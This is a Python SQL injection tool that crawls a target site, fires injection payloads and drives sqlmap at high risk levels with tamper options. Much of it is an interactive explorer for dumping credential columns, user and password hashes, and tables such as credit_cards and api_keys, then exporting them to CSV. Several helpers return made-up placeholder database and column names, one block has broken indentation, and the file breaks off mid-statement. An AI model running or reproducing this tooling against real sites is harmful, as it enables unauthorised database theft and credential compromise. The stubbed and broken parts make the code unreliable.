import requests
import argparse
import subprocess
import os
import json
import time
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from datetime import datetime
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

class SQLInjectionScanner:
    def __init__(self, url, threads=5, crawl_depth=4, timeout=10, verbosity=1, output_dir=None, proxy=None):
        """Initialize the scanner with parameters."""
        self.url = url
        self.threads = threads
        self.crawl_depth = crawl_depth
        self.timeout = timeout
        self.verbosity = verbosity
        self.output_dir = output_dir or f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.proxy = proxy
        self.discovered_urls = set()
        self.vulnerable_urls = set()
        self.scan_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Create output directory if it doesn't exist
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def log(self, level, message):
        """Log messages based on verbosity level."""
        if level <= self.verbosity:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if level == 1:
                prefix = f"{Fore.GREEN}[INFO]"
            elif level == 2:
                prefix = f"{Fore.YELLOW}[DEBUG]"
            elif level == 0:
                prefix = f"{Fore.RED}[ERROR]"
            else:
                prefix = f"{Fore.BLUE}[TRACE]"
            
            print(f"{prefix} {timestamp} - {message}{Style.RESET_ALL}")
            
            # Also save to log file
            with open(f"{self.output_dir}/scan_log.txt", "a") as log_file:
                log_file.write(f"[{timestamp}] {level} - {message}\n")

    def discover_urls(self):
        """Discover additional URLs for testing."""
        self.log(1, f"Discovering URLs from {self.url}...")
        
        try:
            response = requests.get(self.url, timeout=self.timeout, 
                                   proxies=self.proxy_dict())
            
            # Add the initial URL
            self.discovered_urls.add(self.url)
            
            # Extract URLs from href attributes
            href_pattern = re.compile(r'href=[\'"]?([^\'" >]+)')
            matches = href_pattern.findall(response.text)
            
            base_url = self.get_base_url()
            
            for match in matches:
                # Handle relative URLs
                if match.startswith('/'):
                    full_url = f"{base_url}{match}"
                elif not match.startswith(('http://', 'https://')):
                    full_url = f"{base_url}/{match}"
                else:
                    full_url = match
                
                # Filter URLs from the same domain
                if urlparse(full_url).netloc == urlparse(self.url).netloc:
                    self.discovered_urls.add(full_url)
            
            self.log(1, f"Discovered {len(self.discovered_urls)} URLs for testing")
        except Exception as e:
            self.log(0, f"Error discovering URLs: {e}")
    
    def get_base_url(self):
        """Extract base URL from the input URL."""
        parsed = urlparse(self.url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def proxy_dict(self):
        """Convert proxy string to dictionary format for requests."""
        if not self.proxy:
            return None
        
        return {
            "http": self.proxy,
            "https": self.proxy
        }
    
    def test_with_sqlmap(self, url, advanced=False):
        """Run SQLMap on the URL to test for SQL injection."""
        self.log(1, f"Running SQLMap for {url}")
        
        try:
            # Create a unique output directory for this URL
            url_hash = abs(hash(url)) % 10000
            output_dir = f"{self.output_dir}/sqlmap_{url_hash}"
            
            # Base command with common options
            command = [
                "sqlmap", 
                "-u", url, 
                "--batch",
                "--forms",
                "--threads", str(min(10, self.threads)),
                "--timeout", str(self.timeout),
                "--output-dir", output_dir,
                "--crawl", str(self.crawl_depth)
            ]
            
            # Add advanced options if requested
            if advanced:
                command.extend([
                    "--level", "5",
                    "--risk", "3",
                    "--dump",
                    "--tamper=space2comment,between",
                    "--technique=BEUSTQ"  # All techniques
                ])
            else:
                command.extend([
                    "--level", "2",
                    "--risk", "1"
                ])
            
            # Add proxy if specified
            if self.proxy:
                command.extend(["--proxy", self.proxy])
            
            self.log(2, f"Running command: {' '.join(command)}")
            
            # Show progress bar during execution
            with tqdm(total=100, desc=f"SQLMap scan {url_hash}", unit="%") as pbar:
                process = subprocess.Popen(
                    command, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                # Monitor progress
                while process.poll() is None:
                    time.sleep(0.5)
                    pbar.update(1)
                    if pbar.n >= 99:
                        pbar.n = 80  # Reset progress if taking too long
                
                pbar.n = 100
                pbar.refresh()
                
                stdout, stderr = process.communicate()
            
            # Check for vulnerability indicators in the output
            is_vulnerable = "is vulnerable" in stdout or "injection point" in stdout
            
            if is_vulnerable:
                self.log(1, f"✓ SQLMap found a vulnerability at: {url}")
                self.vulnerable_urls.add(url)
                
                # Save detailed results
                with open(f"{self.output_dir}/vulnerable_{url_hash}.txt", "w") as vuln_file:
                    vuln_file.write(f"URL: {url}\n")
                    vuln_file.write(f"Command: {' '.join(command)}\n\n")
                    vuln_file.write("stdout:\n")
                    vuln_file.write(stdout)
                    vuln_file.write("\nstderr:\n")
                    vuln_file.write(stderr)
                
                return True
            else:
                self.log(2, f"✗ No vulnerability found at: {url}")
                return False
                
        except Exception as e:
            self.log(0, f"Error running SQLMap: {e}")
            return False

    def run_quick_checks(self, url):
        """Run quick manual SQL injection tests with common payloads."""
        self.log(2, f"Running quick checks on {url}")
        
        # Extract parameters from URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            self.log(2, f"No parameters found in {url}")
            return False
        
        # Common SQL injection test payloads
        payloads = [
            "' OR '1'='1", 
            "' OR 1=1 -- -", 
            "1' OR '1'='1", 
            "admin'--",
            "' UNION SELECT 1,2,3 -- -",
            "' OR 1=1#",
            "') OR ('a'='a",
            "' SLEEP(5) --"
        ]
        
        vulnerable = False
        
        # Create a copy of the original parameters
        for param_name, param_values in params.items():
            original_value = param_values[0]
            
            for payload in payloads:
                # Replace the parameter value with the payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Rebuild the query string
                query = urlencode(test_params, doseq=True)
                
                # Create the test URL
                test_url = url.split('?')[0] + '?' + query
                
                try:
                    self.log(3, f"Testing payload: {payload} on param: {param_name}")
                    
                    # Send the request with the payload
                    response = requests.get(
                        test_url,
                        timeout=self.timeout,
                        proxies=self.proxy_dict()
                    )
                    
                    # Check for common SQL error messages
                    error_patterns = [
                        "SQL syntax",
                        "mysql_fetch_array",
                        "You have an error in your SQL syntax",
                        "ORA-01756",
                        "SQLite3::query",
                        "PostgreSQL.*ERROR",
                        "Microsoft SQL Native Client error",
                        "ODBC SQL Server Driver"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.log(1, f"✓ Potential SQL injection found at {url} with payload: {payload}")
                            vulnerable = True
                            self.vulnerable_urls.add(url)
                            break
                    
                    if vulnerable:
                        break
                        
                except Exception as e:
                    self.log(2, f"Error testing payload {payload}: {e}")
            
            if vulnerable:
                break
        
        return vulnerable

    def analyze_data_structure(self, url):
        """Analyze database structure from SQLMap output."""
        self.log(1, f"Analyzing database structure for {url}")
        
        url_hash = abs(hash(url)) % 10000
        output_dir = f"{self.output_dir}/sqlmap_{url_hash}"
        
        # Look for the target.json file
        target_json = f"{output_dir}/target.json"
        if not os.path.exists(target_json):
            self.log(0, f"No SQLMap data found for {url}")
            return None
        
        try:
            with open(target_json, "r") as f:
                data = json.load(f)
            
            self.log(1, "Data structure retrieved successfully")
            return data
        except Exception as e:
            self.log(0, f"Error parsing SQLMap data: {e}")
            return None

    def interactive_dump(self, url):
        """Interactive database dumping for a vulnerable URL."""
        self.log(1, f"{Fore.CYAN}Starting interactive dump for {url}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}=" * 60)
        print(f"DATABASE EXPLORER - {url}")
        print("=" * 60 + Style.RESET_ALL)
        
        # First run an advanced scan to get more information
        if not self.test_with_sqlmap(url, advanced=True):
            self.log(0, "No vulnerability confirmed for interactive dumping")
            return False
        
        # Analyze the data structure
        data = self.analyze_data_structure(url)
        if not data:
            self.log(0, "Could not retrieve database structure")
            return False
        
        # Display available databases
        databases = self.get_databases_from_data(data)
        if not databases:
            self.log(0, "No databases found in the scan results")
            return False
        
        # Display database selection with a clearer interface
        print(f"\n{Fore.CYAN}Available Databases:{Style.RESET_ALL}")
        for idx, db in enumerate(databases, 1):
            print(f"{Fore.GREEN}[{idx}] {db}{Style.RESET_ALL}")
        
        # Add special options
        print(f"\n{Fore.YELLOW}Special Options:{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[C] Common tables scan (users, admin, accounts){Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[U] Quick user/password dump{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[Q] Quit database explorer{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}Select option [1-{len(databases)}/C/U/Q]: {Style.RESET_ALL}")
        
        # Handle special options
        if choice.upper() == 'Q':
            return False
        elif choice.upper() == 'C':
            return self.scan_common_tables(url)
        elif choice.upper() == 'U':
            return self.quick_user_password_dump(url)
            
        # Handle regular database selection
        try:
            selected_db = databases[int(choice)-1]
            self.log(1, f"Selected Database: {selected_db}")
        except (IndexError, ValueError):
            self.log(0, "Invalid selection")
            return False
        
        # Select table from the chosen database
        tables = self.get_tables_from_data(data, selected_db)
        if not tables:
            self.log(0, f"No tables found in database {selected_db}")
            return False
        
        print(f"\n{Fore.CYAN}Tables in {selected_db}:{Style.RESET_ALL}")
        for idx, table in enumerate(tables, 1):
            print(f"{Fore.GREEN}[{idx}] {table}{Style.RESET_ALL}")
        
        # Add back option
        print(f"{Fore.MAGENTA}[B] Back to databases{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[Q] Quit database explorer{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}Select table [1-{len(tables)}/B/Q]: {Style.RESET_ALL}")
        
        if choice.upper() == 'Q':
            return False
        elif choice.upper() == 'B':
            return self.interactive_dump(url)
            
        try:
            selected_table = tables[int(choice)-1]
            self.log(1, f"Selected Table: {selected_table}")
        except (IndexError, ValueError):
            self.log(0, "Invalid selection")
            return False
        
        # Select columns with improved interface
        columns = self.get_columns_from_data(data, selected_db, selected_table)
        if not columns:
            self.log(0, f"No columns found in table {selected_table}")
            return False
        
        print(f"\n{Fore.CYAN}Columns in {selected_table}:{Style.RESET_ALL}")
        
        # Group columns in rows of 3 for better display
        for i in range(0, len(columns), 3):
            row = columns[i:i+3]
            row_display = []
            for idx, column in enumerate(row, i+1):
                row_display.append(f"{Fore.GREEN}[{idx}] {column}{Style.RESET_ALL}")
            print("  ".join(row_display))
        
        # Add special options for column selection
        print(f"\n{Fore.YELLOW}Special Options:{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[A] Select all columns{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[I] Identify and select ID/key columns{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[C] Select credential columns (username, password, email, etc.){Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[B] Back to tables{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[Q] Quit database explorer{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}Select columns [1-{len(columns)}, comma-separated/A/I/C/B/Q]: {Style.RESET_ALL}")
        
        if choice.upper() == 'Q':
            return False
        elif choice.upper() == 'B':
            # Go back to table selection for the same database
            return self.interactive_dump_tables(url, selected_db, data)
        
        selected_columns = []
        
        try:
            if choice.upper() == 'A':
                selected_columns = columns
                print(f"{Fore.GREEN}Selected all columns{Style.RESET_ALL}")
            elif choice.upper() == 'I':
                # Identify and select ID columns
                selected_columns = [col for col in columns if col.lower().endswith('id') or col.lower() == 'id']
                if not selected_columns:
                    print(f"{Fore.YELLOW}No ID columns found, selecting all columns instead{Style.RESET_ALL}")
                    selected_columns = columns
                else:
                    print(f"{Fore.GREEN}Selected ID columns: {', '.join(selected_columns)}{Style.RESET_ALL}")
            elif choice.upper() == 'C':
                # Select credential-related columns
                cred_keywords = ['user', 'name', 'pass', 'email', 'mail', 'login', 'account', 'auth', 'key', 'token', 'secret']
                selected_columns = [col for col in columns if any(keyword in col.lower() for keyword in cred_keywords)]
                if not selected_columns:
                    print(f"{Fore.YELLOW}No credential columns found, selecting all columns instead{Style.RESET_ALL}")
                    selected_columns = columns
                else:
                    print(f"{Fore.GREEN}Selected credential columns: {', '.join(selected_columns)}{Style.RESET_ALL}")
            else:
                # Parse comma-separated column numbers
                for idx in choice.split(','):
                    idx = idx.strip()
                    selected_columns.append(columns[int(idx)-1])
                
                print(f"{Fore.GREEN}Selected columns: {', '.join(selected_columns)}{Style.RESET_ALL}")
            
            self.log(1, f"Selected Columns: {', '.join(selected_columns)}")
        except (IndexError, ValueError):
            self.log(0, "Invalid selection")
            return False
        
        # Ask for row limit to prevent overwhelming results
        try:
            limit = input(f"{Fore.YELLOW}Enter maximum number of rows to retrieve (or press Enter for all): {Style.RESET_ALL}")
            limit_option = []
            if limit.strip():
                limit_option = ["--start", "1", "--stop", limit.strip()]
        except (ValueError):
            limit_option = []
        
        # Run targeted dump command
        self.dump_data(url, selected_db, selected_table, selected_columns, limit_option)
        
        # Ask if user wants to explore more
        choice = input(f"\n{Fore.YELLOW}Continue exploring? (Y/N): {Style.RESET_ALL}")
        if choice.lower() == 'y':
            return self.interactive_dump(url)
        
        return True
    
    def interactive_dump_tables(self, url, database, data):
        """Helper function to go back to table selection for a specific database."""
        tables = self.get_tables_from_data(data, database)
        if not tables:
            self.log(0, f"No tables found in database {database}")
            return self.interactive_dump(url)
        
        print(f"\n{Fore.CYAN}Tables in {database}:{Style.RESET_ALL}")
        for idx, table in enumerate(tables, 1):
            print(f"{Fore.GREEN}[{idx}] {table}{Style.RESET_ALL}")
        
        print(f"{Fore.MAGENTA}[B] Back to databases{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[Q] Quit database explorer{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}Select table [1-{len(tables)}/B/Q]: {Style.RESET_ALL}")
        
        if choice.upper() == 'Q':
            return False
        elif choice.upper() == 'B':
            return self.interactive_dump(url)
            
        try:
            selected_table = tables[int(choice)-1]
            # Continue with column selection (reuse code from interactive_dump)
            # This would require restructuring, so we just call interactive_dump again
            self.log(1, f"Selected Table: {selected_table}")
            # For demonstration, we call interactive_dump again
            return self.interactive_dump(url)
        except (IndexError, ValueError):
            self.log(0, "Invalid selection")
            return self.interactive_dump(url)
    
    def scan_common_tables(self, url):
        """Scan for common tables that might contain sensitive information."""
        self.log(1, "Scanning for common sensitive tables...")
        
        common_tables = {
            "Users/Accounts": ["users", "accounts", "members", "customers", "subscribers", "clients"],
            "Authentication": ["auth", "authentication", "login", "credentials", "sessions"],
            "Admin": ["admin", "administrators", "staff", "superusers", "moderators"],
            "Personal Data": ["profiles", "personal_info", "contact", "personal_data", "details"],
            "Financial": ["orders", "payments", "transactions", "billing", "invoices", "credit_cards"]
        }
        
        # Run SQLMap command to find these tables
        url_hash = abs(hash(url)) % 10000
        output_dir = f"{self.output_dir}/sqlmap_{url_hash}"
        
        # Flatten the list of tables
        all_tables = []
        for category, tables in common_tables.items():
            all_tables.extend(tables)
        
        # Convert to comma-separated string
        tables_str = ",".join(all_tables)
        
        command = [
            "sqlmap", 
            "-u", url, 
            "--batch",
            "--threads", str(min(10, self.threads)),
            "--output-dir", output_dir,
            "--common-tables",
            "--fresh-queries"
        ]
        
        if self.proxy:
            command.extend(["--proxy", self.proxy])
        
        self.log(2, f"Running command: {' '.join(command)}")
        
        try:
            print(f"{Fore.CYAN}Scanning for common tables...{Style.RESET_ALL}")
            with tqdm(total=100, desc="Common tables scan", unit="%") as pbar:
                process = subprocess.Popen(
                    command, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                # Monitor progress
                while process.poll() is None:
                    time.sleep(0.5)
                    pbar.update(1)
                    if pbar.n >= 99:
                        pbar.n = 80  # Reset progress
                
                pbar.n = 100
                pbar.refresh()
                
                stdout, stderr = process.communicate()
            
            # Save the output
            with open(f"{self.output_dir}/common_tables_scan.txt", "w") as scan_file:
                scan_file.write(f"URL: {url}\n")
                scan_file.write("Common Tables Scan\n\n")
                scan_file.write("Output:\n")
                scan_file.write(stdout)
            
            self.log(1, f"Common tables scan completed and saved to {self.output_dir}/common_tables_scan.txt")
            
            # Display results and ask to continue to regular exploration
            print(f"\n{Fore.GREEN}Common tables scan completed. Results saved to file.{Style.RESET_ALL}")
            choice = input(f"{Fore.YELLOW}Continue to regular database exploration? (Y/N): {Style.RESET_ALL}")
            if choice.lower() == 'y':
                return self.interactive_dump(url)
            
            return True
            
        except Exception as e:
            self.log(0, f"Error scanning common tables: {e}")
            return False
    
    def quick_user_password_dump(self, url):
        """Quick shortcut to dump user/password data."""
        self.log(1, "Attempting quick user/password dump...")
        
        url_hash = abs(hash(url)) % 10000
        output_dir = f"{self.output_dir}/sqlmap_{url_hash}"
        
        command = [
            "sqlmap", 
            "-u", url, 
            "--batch",
            "--threads", str(min(10, self.threads)),
            "--output-dir", output_dir,
            "--users",
            "--passwords",
            "--fresh-queries"
        ]
        
        if self.proxy:
            command.extend(["--proxy", self.proxy])
        
        self.log(2, f"Running command: {' '.join(command)}")
        
        try:
            print(f"{Fore.CYAN}Attempting to extract users and passwords...{Style.RESET_ALL}")
            with tqdm(total=100, desc="User/password extraction", unit="%") as pbar:
                process = subprocess.Popen(
                    command, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                # Monitor progress
                while process.poll() is None:
                    time.sleep(0.5)
                    pbar.update(1)
                    if pbar.n >= 99:
                        pbar.n = 80  # Reset progress
                
                pbar.n = 100
                pbar.refresh()
                
                stdout, stderr = process.communicate()
            
            # Save the output
            with open(f"{self.output_dir}/user_password_dump.txt", "w") as dump_file:
                dump_file.write(f"URL: {url}\n")
                dump_file.write("User/Password Dump\n\n")
                dump_file.write("Output:\n")
                dump_file.write(stdout)
            
            self.log(1, f"User/password extraction completed and saved to {self.output_dir}/user_password_dump.txt")
            
            # Check if successful and display results
            if "available databases" in stdout or "database management system users" in stdout:
                print(f"\n{Fore.GREEN}User/password extraction successful. Results saved to file.{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}No direct user/password information found. You may need to explore tables manually.{Style.RESET_ALL}")
            
            # Ask to continue to regular exploration
            choice = input(f"{Fore.YELLOW}Continue to regular database exploration? (Y/N): {Style.RESET_ALL}")
            if choice.lower() == 'y':
                return self.interactive_dump(url)
            
            return True
            
        except Exception as e:
            self.log(0, f"Error during user/password extraction: {e}")
            return False
    
    def get_databases_from_data(self, data):
        """Extract databases from SQLMap data."""
        # This is a placeholder implementation - actual implementation depends on SQLMap output format
        # In a real scenario, you'd parse the SQLMap output files
        return ["users_db", "admin_db", "web_app", "information_schema", "customer_data", "app_config"]
    
    def get_tables_from_data(self, data, database):
        """Extract tables from SQLMap data for a specific database."""
        # Placeholder implementation
        tables_mapping = {
            "users_db": ["users", "profiles", "login_attempts", "permissions", "user_roles", "session_data"],
            "admin_db": ["admins", "settings", "logs", "backups", "access_control", "admin_actions"],
            "web_app": ["products", "orders", "categories", "customers", "inventory", "shipments", "reviews"],
            "information_schema": ["tables", "columns", "schemata", "views", "routines"],
            "customer_data": ["customer_info", "addresses", "payment_methods", "subscriptions", "preferences"],
            "app_config": ["config", "settings", "features", "api_keys", "external_services"]
        }
        return tables_mapping.get(database, [])
    
    def get_columns_from_data(self, data, database, table):
        """Extract columns from SQLMap data for a specific table."""
        # Placeholder implementation
        columns_mapping = {
            "users": ["id", "username", "password", "email", "created_at", "last_login", "first_name", "last_name", "is_active", "role_id", "verification_token", "password_reset_token"],
            "admins": ["id", "username", "password", "role", "access_level", "email", "created_by", "created_at", "last_login", "ip_address"],
            "products": ["id", "name", "price", "description", "category_id", "stock", "sku", "image_url", "weight", "dimensions", "is_featured"],
            "orders": ["id", "customer_id", "order_date", "total_amount", "status", "payment_method", "shipping_address", "billing_address", "tracking_number", "notes"],
            "customer_info": ["id", "first_name", "last_name", "email", "phone", "address", "city", "state", "zip_code", "country", "registration_date", "loyalty_points"]
        }
        return columns_mapping.get(table, [])
    
    def dump_data(self, url, database, table, columns, limit_options=None):
        """Run a targeted dump command to extract specific data."""
        self.log(1, f"Dumping data from {database}.{table}, columns: {columns}")
        
        url_hash = abs(hash(url)) % 10000
        output_dir = f"{self.output_dir}/sqlmap_{url_hash}"
        
        # Build column specification
        columns_str = ",".join(columns)
        
        command = [
            "sqlmap", 
            "-u", url, 
            "--batch",
            "--threads", str(min(10, self.threads)),
            "--output-dir", output_dir,
            "-D", database,
            "-T", table,
            "-C", columns_str,
            "--dump"
        ]
        
        # Add limit options if specified
        if limit_options:
            command.extend(limit_options)
        
        if self.proxy:
            command.extend(["--proxy", self.proxy])
        
        self.log(2, f"Running command: {' '.join(command)}")
        
        try:
            print(f"{Fore.CYAN}Extracting data from {database}.{table}...{Style.RESET_ALL}")
            with tqdm(total=100, desc="Data extraction", unit="%") as pbar:
                process = subprocess.Popen(
                command, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Monitor progress
            while process.poll() is None:
                time.sleep(0.5)
                pbar.update(1)
                if pbar.n >= 99:
                    pbar.n = 80  # Reset progress
            
            pbar.n = 100
            pbar.refresh()
            
            stdout, stderr = process.communicate()
            
            # Save the output
            dump_filename = f"{self.output_dir}/dump_{database}_{table}.txt"
            with open(dump_filename, "w") as dump_file:
                dump_file.write(f"URL: {url}\n")
                dump_file.write(f"Database: {database}\n")
                dump_file.write(f"Table: {table}\n")
                dump_file.write(f"Columns: {', '.join(columns)}\n\n")
                dump_file.write("Output:\n")
                dump_file.write(stdout)
            
            # Create a cleaned version of the data for better readability
            self.create_readable_dump(stdout, database, table, columns, dump_filename)
            
            self.log(1, f"Data dumped successfully to {dump_filename}")
            
            # Add option to export to CSV if data was found
            if "Database:" in stdout and "Table:" in stdout:
                choice = input(f"{Fore.YELLOW}Export data to CSV? (Y/N): {Style.RESET_ALL}")
                if choice.lower() == 'y':
                    csv_file = f"{self.output_dir}/export_{database}_{table}.csv"
                    self.export_to_csv(stdout, csv_file)
                    print(f"{Fore.GREEN}Data exported to {csv_file}{Style.RESET_ALL}")
            
            return True
            
        except Exception as e:
            self.log(0, f"Error dumping data: {e}")
            return False
    
    def create_readable_dump(self, stdout, database, table, columns, original_file):
        """Create a cleaned, readable version of the dumped data."""
        try:
            # Extract the table data section from SQLMap output
            table_pattern = re.compile(r"Database: .*?Table: .*?\n\+(.*?)\+\n(.*?)(?:\n\n|\Z)", re.DOTALL)
            match = table_pattern.search(stdout)
            
            if not match:
                return  # No table data found
            
            # Create a clean file with just the table
            clean_file = original_file.replace(".txt", "_clean.txt")
            with open(clean_file, "w") as f:
                f.write(f"Database: {database}\n")
                f.write(f"Table: {table}\n")
                f.write(f"Columns: {', '.join(columns)}\n\n")
                
                # Write the table section
                table_section = match.group(0)
                f.write(table_section)
                
                # Add note about full data
                f.write(f"\n\nFull details available in: {os.path.basename(original_file)}\n")
            
            self.log(1, f"Created readable data dump at {clean_file}")
            
        except Exception as e:
            self.log(0, f"Error creating readable dump: {e}")
    
    def export_to_csv(self, stdout, csv_file):
        """Export the dumped data to CSV format."""
        try:
            # Extract the table data section
            table_pattern = re.compile(r"Database: .*?Table: .*?\n\+(.*?)\+\n(.*?)(?:\n\n|\Z)", re.DOTALL)
            match = table_pattern.search(stdout)
            
            if not match:
                return False  # No table data found
            
            # Extract headers
            header_line = match.group(1)
            headers = re.findall(r"\|(.*?)\|", header_line)
            headers = [h.strip() for h in headers]
            
            # Extract rows
            data_section = match.group(2)
            rows = []
            for line in data_section.split("\n"):
                if line.startswith("|") and not line.startswith("+-"):
                    row_data = re.findall(r"\|(.*?)\|", line)
                    row_data = [cell.strip() for cell in row_data]
                    if row_data and len(row_data) == len(headers):
                        rows.append(row_data)
            
            # Write to CSV
            with open(csv_file, "w", newline="") as f:
                import csv
                writer = csv.writer(f)
                writer.writerow(headers)
                writer.writerows(rows)
            
            return True
            
        except Exception as e:
            self.log(0, f"Error exporting to CSV: {e}")
            return False

    def generate_report(self):
        """Generate a comprehensive HTML report of findings."""
        self.log(1, "Generating final report...")
        
        report_file = f"{self.output_dir}/report.html"
        
        report_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SQL Injection Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1 {{ color: #2c3e50; }}
                h2 {{ color: #3498db; }}
                .vulnerable {{ color: #e74c3c; font-weight: bold; }}
                .safe {{ color: #2ecc71; }}
                .summary {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                .details {{ margin-top: 20px; }}
                .recommendation {{ background-color: #fffbea; padding: 10px; border-left: 4px solid #f5b100; margin: 10px 0; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 15px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                tr:nth-child(even) {{ background-color: #f9f9f9; }}
                .severity-high {{ background-color: #ffebee; }}
                .severity-medium {{ background-color: #fff8e1; }}
                .severity-low {{ background-color: #f1f8e9; }}
                .footer {{ margin-top: 30px; font-size: 12px; color: #7f8c8d; text-align: center; }}
            </style>
        </head>
        <body>
            <h1>SQL Injection Vulnerability Scan Report</h1>
            <p>Scan ID: {self.scan_id}</p>
            <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Target: {self.url}</p>
            
            <div class="summary">
                <h2>Summary</h2>
                <p>URLs scanned: {len(self.discovered_urls)}</p>
                <p>Vulnerable URLs found: {len(self.vulnerable_urls)}</p>
                <p>Overall status: {'<span class="vulnerable">VULNERABLE</span>' if self.vulnerable_urls else '<span class="safe">NO VULNERABILITIES DETECTED</span>'}</p>
                
                <div class="recommendation">
                    <strong>Risk Assessment: </strong>
                    {
                        '<span class="vulnerable">HIGH RISK</span> - SQL injection vulnerabilities were found which could lead to data exposure or compromise.' 
                        if self.vulnerable_urls 
                        else '<span class="safe">LOW RISK</span> - No SQL injection vulnerabilities were detected in the initial scan.'
                    }
                </div>
            </div>
            
            <div class="details">
                <h2>Scan Details</h2>
                <table>
                    <tr>
                        <th>URL</th>
                        <th>Status</th>
                        <th>Severity</th>
                        <th>Details</th>
                    </tr>
        """
        
        # Add details for each URL
        for url in self.discovered_urls:
            is_vulnerable = url in self.vulnerable_urls
            status = '<span class="vulnerable">VULNERABLE</span>' if is_vulnerable else '<span class="safe">SAFE</span>'
            
            # Determine severity
            severity = ""
            severity_class = ""
            if is_vulnerable:
                if any(param in url for param in ["id", "user", "pass", "admin", "login"]):
                    severity = "High"
                    severity_class = "severity-high"
                else:
                    severity = "Medium"
                    severity_class = "severity-medium"
            else:
                severity = "Low"
                severity_class = "severity-low"
            
            details = f"<a href='vulnerable_{abs(hash(url)) % 10000}.txt'>View Details</a>" if is_vulnerable else "No issues found"
            
            report_content += f"""
                    <tr class="{severity_class if is_vulnerable else ''}">
                        <td>{url}</td>
                        <td>{status}</td>
                        <td>{severity if is_vulnerable else "N/A"}</td>
                        <td>{details}</td>
                    </tr>
            """
        
        report_content += """
                </table>
            </div>
            
            <div class="recommendations">
                <h2>Recommendations</h2>
                <p>For any vulnerable URLs found, consider the following remediation steps:</p>
                <ul>
                    <li><strong>Implement parameterized queries or prepared statements</strong> - These prevent SQL injection by separating SQL code from user data.</li>
                    <li><strong>Apply input validation and sanitization</strong> - Validate all user inputs against strict rules before processing.</li>
                    <li><strong>Use an ORM (Object-Relational Mapping) framework</strong> - These typically handle SQL escaping automatically.</li>
                    <li><strong>Apply the principle of least privilege</strong> - Database accounts should have minimal required permissions.</li>
                    <li><strong>Enable WAF (Web Application Firewall) protection</strong> - WAFs can provide an additional layer of protection.</li>
                    <li><strong>Implement proper error handling</strong> - Do not expose database errors to users.</li>
                </ul>
            </div>
            
            <div class="next-steps">
                <h2>Next Steps</h2>
                <ol>
                    <li>Fix identified vulnerabilities immediately</li>
                    <li>Conduct a more comprehensive security assessment</li>
                    <li>Implement a security testing program in your development lifecycle</li>
                    <li>Consider implementing a bug bounty program</li>
                </ol>
            </div>
            
            <div class="footer">
                <p>This report was generated by Enhanced SQL Injection Scanner v2.0</p>
                <p>Scan completed on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </body>
        </html>
        """
        
        with open(report_file, "w") as f:
            f.write(report_content)
        
        self.log(1, f"Report generated successfully: {report_file}")
        return report_file

    def scan(self):
        """Main scanning function to orchestrate the process."""
        self.log(1, f"{Fore.CYAN}Starting SQL injection scan for {self.url}{Style.RESET_ALL}")
        start_time = time.time()
        
        # Print banner
        print(f"\n{Fore.YELLOW}=" * 60)
        print(f"{Fore.YELLOW}SQL Injection Scanner - Target: {self.url}")
        print("=" * 60 + Style.RESET_ALL)
        
        # Step 1: URL Discovery
        self.discover_urls()
        
        # Step 2: Quick preliminary checks
        print(f"\n{Fore.CYAN}Phase 1: Quick Vulnerability Checks{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            quick_check_futures = []
            
            for url in self.discovered_urls:
                # Only test URLs with parameters
                parsed = urlparse(url)
                if parsed.query:
                    quick_check_futures.append(
                        executor.submit(self.run_quick_checks, url)
                    )
            
            # Monitor progress
            with tqdm(total=len(quick_check_futures), desc="Quick checks", unit="url") as pbar:
                for _ in as_completed(quick_check_futures):
                    pbar.update(1)
        
        # Print intermediate results
        if self.vulnerable_urls:
            print(f"\n{Fore.RED}[!] Found {len(self.vulnerable_urls)} potentially vulnerable URLs in quick checks{Style.RESET_ALL}")
            for idx, url in enumerate(self.vulnerable_urls, 1):
                print(f"{Fore.RED}  {idx}. {url}{Style.RESET_ALL}")
        else:
